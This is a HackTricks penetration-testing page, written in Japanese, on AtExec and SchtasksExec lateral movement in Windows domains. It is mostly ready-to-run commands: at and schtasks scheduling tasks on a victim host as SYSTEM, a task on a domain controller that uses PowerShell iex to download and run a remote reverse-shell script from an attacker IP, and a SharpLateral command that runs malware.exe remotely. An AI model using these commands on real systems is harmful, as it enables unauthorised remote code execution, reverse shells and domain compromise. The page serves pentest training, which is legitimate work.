# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## どのように機能するか

Atは、ユーザー名/(パスワード/ハッシュ)を知っているホストでタスクをスケジュールすることを可能にします。したがって、他のホストでコマンドを実行し、その出力を取得するために使用できます。
```
At \\victim 11:00:00PM shutdown -r
```
schtasksを使用して、最初にタスクを作成し、その後呼び出す必要があります。
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
[SharpLateral](https://github.com/mertdas/SharpLateral)も使用できます：
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
[**シルバーチケットを使用したschtasksの詳細はこちら**](../active-directory-methodology/silver-ticket.md#host)。

{{#include ../../banners/hacktricks-training.md}}
